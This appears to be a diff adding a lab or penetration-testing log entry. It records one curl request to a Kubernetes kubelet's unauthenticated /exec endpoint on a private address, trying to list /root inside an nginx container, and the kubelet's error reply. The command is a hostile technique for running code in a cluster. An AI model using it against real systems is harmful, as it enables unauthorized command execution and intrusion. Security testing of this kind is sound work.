@@ -1,0 +1,10 @@
+### [2026-04-04 21:35:45] curl -k -X POST https://10.129.96.167:10250/exec/default/nginx/nginx?command=ls&command=-la&command=/root&stdout=true --output -
+
+$ curl -k -X POST https://10.129.96.167:10250/exec/default/nginx/nginx?command=ls&command=-la&command=/root&stdout=true --output -
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100     52 100     52   0      0   1486      0                              0100     52 100     52   0      0   1484      0                              0100     52 100     52   0      0   1482      0                              0
+you must specify at least 1 of stdin, stdout, stderr
+# Exit code: 0
+# Duration: 2026-04-04 21:35:45
